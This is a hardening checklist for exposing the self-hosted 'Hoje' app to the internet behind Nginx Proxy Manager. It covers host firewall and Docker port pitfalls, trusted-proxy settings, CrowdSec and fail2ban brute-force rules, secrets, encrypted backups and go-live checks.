# Hoje hardening checklist (internet exposure)

For the production layout in the README: `deploy/compose.prod.yml` on one Linux host, Nginx
Proxy Manager (NPM) terminating TLS in front of `hoje-web`. Work top to bottom; the last section
is the go/no-go list. `DC` below means
`docker compose -f deploy/compose.prod.yml --env-file deploy/.env` (plus
`-f deploy/compose.prod.proxy-network.yml` if you use that overlay).

If you are the only user, the strongest option is not to expose Hoje at all: reach it over
WireGuard/Tailscale and skip most of this list. Everything below assumes public exposure.

## 1. Host firewall

- [ ] Default deny inbound; allow only 80/tcp and 443/tcp (for NPM) and SSH from your
      admin network:
      ```bash
      ufw default deny incoming && ufw default allow outgoing
      ufw allow 80,443/tcp
      ufw allow from 192.168.1.0/24 to any port 22 proto tcp   # your LAN / VPN range
      ufw enable
      ```
- [ ] SSH: keys only (`PasswordAuthentication no`, `PermitRootLogin no`), ideally not reachable
      from the internet at all (VPN or LAN only).
- [ ] Repeat the rules for IPv6 (`/etc/default/ufw` has `IPV6=yes`) if the host has a global
      IPv6 address or the domain has an AAAA record.
- [ ] Host updates: `unattended-upgrades` (or your distro's equivalent) enabled, Docker Engine
      kept current.

## 2. Docker publishing pitfalls

Docker inserts its own iptables rules: **a published port (`ports: "8080:8080"`) is reachable
from the network even when ufw denies it.**

- [ ] `hoje-web` is either on NPM's Docker network (overlay `compose.prod.proxy-network.yml`) or
      published on `HOJE_BIND=127.0.0.1`. Never `0.0.0.0` unless NPM is on another machine, and
      then filter it in the `DOCKER-USER` chain so only NPM's IP can connect:
      ```bash
      iptables -I DOCKER-USER -p tcp -m conntrack --ctorigdstport 8080 ! -s <NPM_IP> -j DROP
      ```
- [ ] NPM's admin UI (port 81) is published on `127.0.0.1:81:81` or a LAN address only, never
      on the internet (use an SSH tunnel: `ssh -L 8181:127.0.0.1:81 host`).
- [ ] No other container on the host publishes ports you did not intend:
      `docker ps --format '{{.Names}}\t{{.Ports}}'` shows `0.0.0.0`/`[::]` only for NPM 80/443.
- [ ] From outside your network (phone hotspot, VPS): `nmap -Pn -p- <public IPv4>` (and the IPv6
      address) shows only 80 and 443 open.
- [ ] The API and database are never published (`$DC ps` shows no ports for `api`, `db`,
      `worker`). The API trusts `X-Real-IP`, so nothing but `hoje-web` may reach it.
- [ ] `HOJE_INTEGRATION_ALLOWED_PRIVATE_CIDRS` (FelizAnniv birthday sync) is empty unless someone
      connects a FelizAnniv on a private address, and then as narrow as possible: the FelizAnniv
      host as `/32`, not the whole LAN and never `0.0.0.0/0` or `172.16.0.0/12`. Inside the listed
      ranges a signed-in user can make the API and worker connect to any port (Hoje's own Docker
      networks stay blocked regardless). Check it with `$DC config | grep INTEGRATION`.
- [ ] A FelizAnniv outside your LAN is reached over `https://` (with `http://` the API key
      travels in clear); revoke the key in FelizAnniv (Settings, API Keys) if a Hoje account is
      ever compromised, then Disconnect in Hoje.

## 3. Nginx Proxy Manager

- [ ] Changed NPM's default admin credentials; NPM itself is up to date.
- [ ] Settings, Default Site: "404 Page" or "No Response", so scanners hitting the bare IP get
      nothing.
- [ ] Proxy host for your domain: scheme `http`, forward to `hoje-web:8080` (overlay) or
      `127.0.0.1:<HOJE_HTTP_PORT>`; **Block Common Exploits** on; Websockets not needed.
- [ ] SSL tab: Let's Encrypt certificate, **Force SSL**, **HTTP/2**, **HSTS Enabled**
      (HSTS Subdomains only if every subdomain is HTTPS).
- [ ] Advanced tab contains exactly the README block **plus a body size cap** (the API buffers
      request bodies; NPM's default limit is very large):
      ```
      proxy_buffering off;
      proxy_cache off;
      proxy_read_timeout 1h;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      client_max_body_size 1m;
      ```
      (`1m` blocks imports of export files over 1 MB at the edge. To allow them, use `10m`: Caddy and
      the API keep every route except `/api/v1/import` at 1 MB regardless.)
- [ ] Access List allowing only your own IP attached to the proxy host **until you have
      registered** (section 9), then removed (or kept, if you only use Hoje from fixed places).

## 4. Client IP: `TRUSTED_PROXIES`

The login throttle keys on the client IP that Caddy resolves. Too narrow and every visitor
looks like NPM (one attacker locks everyone out); too wide and a client can pick its own IP.

- [ ] Set `TRUSTED_PROXIES` in `deploy/.env` to the narrowest value for your layout:

  | Layout | Value | How to find it |
  |---|---|---|
  | A. NPM container, overlay network | NPM's IP on that network, `/32` (give NPM a fixed `ipv4_address` so it survives recreation), or the network's subnet if only trusted containers are attached | `docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}} {{end}}' <npm>` / `docker network inspect <net>` |
  | B. NPM native on this host, `HOJE_BIND=127.0.0.1` | the gateway of `hoje_edge` (connections through a published port arrive from Docker's proxy) | `docker network inspect hoje_edge -f '{{(index .IPAM.Config 0).Gateway}}'` |
  | C. NPM on another machine | that machine's LAN IP, `/32` | |

- [ ] `TRUSTED_PROXIES` has no default in `compose.prod.yml`: `$DC config` / `$DC up` fail until it is
      set, so it cannot be forgotten. Avoid `0.0.0.0/0` and whole private ranges.
- [ ] Verify: from your phone on mobile data, open the site and run
      `docker logs --since 2m hoje-web | grep '"uri":"/api/v1/auth/state"'`; `client_ip` must be
      the phone's public IP, not NPM's or a Docker address. Then
      `curl -s -H 'X-Forwarded-For: 203.0.113.7' https://<domain>/healthz` and check that the
      logged `client_ip` is still your real address.

## 5. Brute-force protection at the edge (CrowdSec, or fail2ban)

Hoje already locks per IP and per account; an edge ban stops a source before it costs argon2
time, and covers IPv6 /64 rotation and scanners.

- [ ] Install CrowdSec on the host with the NPM collection and a firewall bouncer:
      `cscli collections install crowdsecurity/nginx-proxy-manager`.
- [ ] Acquire NPM's proxy-host logs (path on the host = wherever NPM's `/data` is mounted), in
      `/etc/crowdsec/acquis.d/npm.yaml` (check the collection's README for the expected `type`):
      ```yaml
      filenames:
        - /opt/npm/data/logs/proxy-host-*_access.log
      labels:
        type: npm
      ```
- [ ] Add a Hoje scenario, `/etc/crowdsec/scenarios/hoje-auth-bf.yaml`. Failed sign-ins answer
      `401`, throttled ones `429`, cross-origin writes `403`, all under `/api/v1/auth/`:
      ```yaml
      type: leaky
      name: local/hoje-auth-bf
      description: "Hoje: repeated failed or throttled authentication requests"
      filter: >-
        evt.Meta.service == 'http' && evt.Meta.http_verb == 'POST' &&
        evt.Meta.http_path startsWith '/api/v1/auth/' &&
        evt.Meta.http_status in ['401', '403', '429']
      groupby: evt.Meta.source_ip
      capacity: 10
      leakspeed: 1m
      blackhole: 5m
      labels:
        remediation: true
      ```
- [ ] Firewall bouncer blocks in the chains Docker traffic actually traverses, otherwise bans do
      not affect a containerised NPM: `iptables_chains: [INPUT, DOCKER-USER]` in
      `/etc/crowdsec/bouncers/crowdsec-firewall-bouncer.yaml`.
- [ ] Test: `cscli decisions add --ip <a test IP> --duration 5m`, confirm it cannot connect,
      then `cscli decisions delete --ip <ip>`.
- [ ] fail2ban alternative: jail on the same NPM log with
      `failregex = ^\[[^\]]+\] \S+ \S+ (?:401|403|429) - POST https? \S+ "/api/v1/auth/[^"]*" \[Client <HOST>\]`
      and `chain = DOCKER-USER` when NPM runs in Docker.
- [ ] Optional second source: `hoje-web`'s JSON access log (`docker logs hoje-web`) carries the
      resolved `request.client_ip`, `request.method`, `request.uri` and `status` of each request.
      Cookies, `X-Csrf-Token`, `Authorization`, `Set-Cookie` and the query string are removed from
      that log.
- [ ] Better source: the API's own security events, which say *why* a request failed. The API
      writes one JSON object per line to its stdout (`docker logs hoje-api-1`; with Docker's
      default `json-file` driver the file is `/var/lib/docker/containers/<id>/<id>-json.log`).
      `ip` is the client address Caddy resolved (the same `client_ip`), so it is only as trustworthy
      as your `TRUSTED_PROXIES`. The events (level `INFO` or lower must be enabled for
      `auth_event`; `auth_failed` and `auth_locked` are `warning`):

      | Match this exact JSON text | Meaning | Other fields |
      |---|---|---|
      | `"event": "auth_failed"` | a wrong password, code, reset token or setup token | `kind` = `login`, `mfa`, `reauth`, `reset` or `setup_token`; `ip`; `acct` (first 12 hex of sha256 of the email, absent for `reset`/`setup_token`) |
      | `"event": "auth_locked"` | a request refused with 429 by the lockout | `kind` (also `forgot`), `ip`, `retry_after` seconds |
      | `"event": "auth_event"` | something that worked: `login_ok`, `registered`, `password_changed`, `password_reset`, `2fa_enabled`, `2fa_disabled`, `recovery_regenerated` | `kind`, `user_id`, `ip` |

      A line looks like
      `{"kind": "login", "ip": "203.0.113.9", "acct": "3f2a9c1b7d44", "event": "auth_failed", "logger": "hoje.audit", "level": "warning", "timestamp": "2026-10-05T12:00:00Z"}`.
      Neither the email, the password, a code nor a token is ever written. Use the first two rows
      for bans (`ip` comes before `event` on those lines) and alert on any `auth_event` you do not
      recognise (a `password_reset` or `2fa_disabled` you did not do).
- [ ] CrowdSec on those lines: add a `docker` data source for the API container in
      `/etc/crowdsec/acquis.d/hoje-api.yaml` (see CrowdSec's Docker data source documentation for
      the exact options; the container is `hoje-api-1` with the default compose project name):
      ```yaml
      source: docker
      container_name_regexp:
        - hoje-api-.*
      labels:
        type: hoje-api
      ```
      then add a small parser and scenario of your own for `type: hoje-api` that extract `ip` and
      react to the two events above (CrowdSec parsers and scenarios are documented at
      docs.crowdsec.net; check them with `cscli explain --log '<a line from above>' --type hoje-api`
      before relying on them). The NPM collection does not know these lines.
- [ ] fail2ban alternative on those lines (`/etc/fail2ban/filter.d/hoje-auth.conf`; the backslashes
      are there because Docker wraps each log line in JSON again):
      ```ini
      [Definition]
      failregex = ^.*\\"ip\\": \\"<HOST>\\".*\\"event\\": \\"auth_(?:failed|locked)\\"
      ```
      with a jail whose `logpath` is the API container's `*-json.log` file and `chain = DOCKER-USER`
      when NPM runs in Docker. Keep `maxretry` above the in-app lockout threshold (5) so you ban
      scanners, not yourself.

## 6. Secrets

- [ ] `deploy/.env` is `chmod 600`, owned by root (or the deploy user), not in git
      (`git status` clean), not world-readable in any backup of the host.
- [ ] `HOJE_SECRET_KEY` from `openssl rand -base64 32`, `POSTGRES_PASSWORD` from
      `openssl rand -hex 24`, no example values left (`grep change-me deploy/.env` prints nothing).
- [ ] A copy of `deploy/.env` (at least `HOJE_SECRET_KEY` and `POSTGRES_PASSWORD`) is stored
      offline, e.g. in your password manager, separately from the database dumps.
- [ ] Understand rotation: changing `HOJE_SECRET_KEY` makes stored TOTP secrets unreadable
      (sign in with a recovery code, disable 2FA, enable it again) and invalidates CSRF tokens of
      open sessions (reload the page) and of the trusted-device cookies (known browsers fall back
      to the shared per-account lockout until they sign in again). Rotate only if the key leaked.
- [ ] Recovery codes saved offline; 2FA enabled.
- [ ] SMTP credentials are an app password / send-only credential for the relay, not your
      mailbox password. Docker Hub token is Read & Write for the two repositories only.

## 7. Backups

- [ ] Settings > Backups (as the owner) shows a recent successful backup and no warning;
      "Back up now" succeeds. `$DC exec worker ls -l /backups` lists the dumps (the worker is the
      only container that mounts them; the API cannot read or delete them).
- [ ] A host backup directory (`HOJE_BACKUP_DIR_HOST`) is owned by uid 10001 and not readable by
      other users (`sudo chown 10001:10001 <dir>; sudo chmod 700 <dir>`).
- [ ] Dumps are copied off the host at least daily, **encrypted** (they contain every event,
      note, email and password hash in plaintext), e.g.:
      ```bash
      latest=$(ls -t /srv/hoje/backups/hoje-*.dump | head -1)   # HOJE_BACKUP_DIR_HOST
      age -r <your age public key> -o "/mnt/offsite/$(basename "$latest").age" "$latest"
      ```
      or restic/borg with a repository password. Copies on the same disk do not count.
- [ ] Restore drill done once now and then every few months: restore the newest off-host copy
      into a scratch stack (`deploy/backup/restore.md`, "Restoring onto a brand-new host"), sign
      in with 2FA, check recent events.
- [ ] The worker can read and delete the local dumps, so a compromised worker can wipe them:
      the encrypted off-host copy is the real backup. Keep its credentials out of the worker.
- [ ] `BACKUP_KEEP_DAYS` and the off-host retention match how far back you might need to go.

## 8. Updates, monitoring, email

- [ ] Watch the GitHub repository for releases (Watch, Custom, Releases).
- [ ] `HOJE_TAG` pinned to a version (`0.2.0`), not `latest`; upgrade with backup, then
      `$DC pull && $DC up -d && $DC ps` (README "Upgrades"). `$DC pull` also refreshes
      `postgres:17-alpine`; update NPM and CrowdSec too.
- [ ] External uptime check on `https://<domain>/healthz` (Uptime Kuma, healthchecks.io, ...),
      alerting you by a channel other than this server's email.
- [ ] Alert on any `unhealthy` container (`docker ps --filter health=unhealthy` from cron), on
      disk usage above 80 % (`df -h`, `docker system df`), and on log lines
      `unhandled_exception`, `worker_cycle_failed`, `email_send_failed` and `backup_failed`
      (a failed backup does not make the worker unhealthy; it shows in Settings > Backups).
      `felizanniv_sync_failed` (warning) is informational: the user sees the error in Settings.
- [ ] Mail: the relay signs `SMTP_FROM`'s domain with **DKIM**, the domain's **SPF** record
      includes the relay, **DMARC** at least `p=quarantine`. Settings, Email, "Send test email"
      arrives with `spf=pass dkim=pass` in the headers.
- [ ] SMTP uses TLS: port 587 with `SMTP_STARTTLS=true` or 465 with `SMTP_TLS=true`; never both
      false on a relay outside the host.

## 9. Before you expose it

- [ ] Sections 1 to 4 done; external `nmap` shows only 80/443.
- [ ] `deploy/.env` complete: `HOJE_PUBLIC_URL=https://<domain>` exactly (scheme + host, no
      trailing slash), `HOJE_ALLOW_REGISTRATION=false`, `TRUSTED_PROXIES` set precisely.
- [ ] NPM Access List restricted to your IP is attached to the proxy host.
- [ ] `$DC up -d`; `$DC ps` all healthy; `https://<domain>/healthz` answers `{"status":"ok"}`.
- [ ] Security headers present:
      `curl -sI https://<domain>/ | grep -iE 'content-security|strict-transport|x-frame|referrer|x-content-type'`.
- [ ] `http://<domain>/` redirects to https.
- [ ] Register your account now (registration closes after the first user), enable 2FA, store
      the recovery codes, send a test email.
- [ ] Sign in from a second browser and confirm a change appears live; sign out works.
- [ ] Two wrong passwords from your phone show up in `hoje-web`'s log with the phone's IP
      (section 4) and, after enough attempts, as a CrowdSec decision (section 5).
- [ ] First off-host encrypted backup copied and a restore tested (section 7).
- [ ] Remove the Access List (or keep it if your access pattern allows), and re-run the external
      `nmap` and header checks.
